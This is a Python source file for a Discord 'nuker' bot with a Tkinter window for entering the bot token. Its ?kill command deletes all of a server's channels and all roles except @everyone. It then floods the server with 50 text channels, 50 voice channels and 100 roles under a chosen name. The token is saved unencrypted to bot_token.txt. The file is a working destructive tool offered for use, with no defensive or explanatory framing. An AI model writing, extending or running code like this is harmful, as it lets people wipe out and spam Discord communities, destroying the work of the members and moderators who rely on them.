import tkinter as tk
from tkinter import messagebox
import os
import discord
from discord.ext import commands

# Define the bot command
intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='?', intents=intents)


@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    print('Use ?kill [channels/role name] to delete all channels, roles and create new ones.')


@bot.command()
async def kill(ctx, *, name: str = None):
    guild = ctx.guild

    # Delete all channels
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'Deleted channel {channel.name}')
        except discord.Forbidden:
            print(f'No permission to delete {channel.name}')
        except discord.HTTPException as e:
            print(f'Failed to delete {channel.name}: {e}')

    # Delete all roles
    for role in guild.roles:
        if role.name != "@everyone":  # Don't delete the @everyone role
            try:
                await role.delete()
                print(f'Deleted role {role.name}')
            except discord.Forbidden:
                print(f'No permission to delete {role.name}')
            except discord.HTTPException as e:
                print(f'Failed to delete {role.name}: {e}')

    # Create new channels and roles
    if name:
        for i in range(50):
            try:
                await guild.create_text_channel(f'{name} Text {i + 1}')
                await guild.create_voice_channel(f'{name} Voice {i + 1}')
                print(f'Created {name} Text {i + 1} and {name} Voice {i + 1}')
            except discord.Forbidden:
                print(f'No permission to create channels.')
            except discord.HTTPException as e:
                print(f'Failed to create channels: {e}')

        for i in range(100):
            try:
                await guild.create_role(name=f'{name} Role {i + 1}')
                print(f'Created role {name} Role {i + 1}')
            except discord.Forbidden:
                print(f'No permission to create roles.')
            except discord.HTTPException as e:
                print(f'Failed to create roles: {e}')

        await ctx.send(f'50 text channels, 50 voice channels, and 100 roles named "{name}" created!')


def run_bot(token):
    bot.run(token)


class BotGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Discord Bot Token Entry")

        self.label = tk.Label(root, text="Enter Bot Token:")
        self.label.pack(pady=10)

        self.token_entry = tk.Entry(root, width=50)
        self.token_entry.pack(pady=5)

        self.run_button = tk.Button(root, text="Run Bot", command=self.run_bot)
        self.run_button.pack(pady=20)

    def run_bot(self):
        token = self.token_entry.get().strip()
        if not token:
            messagebox.showerror("Error", "Bot token cannot be empty.")
            return

        with open("bot_token.txt", "w") as f:
            f.write(token)

        messagebox.showinfo("Success", "Bot token saved! Running bot...")
        self.root.destroy()

        # Run the bot
        run_bot(token)


if __name__ == "__main__":
    root = tk.Tk()
    gui = BotGUI(root)
    root.mainloop()
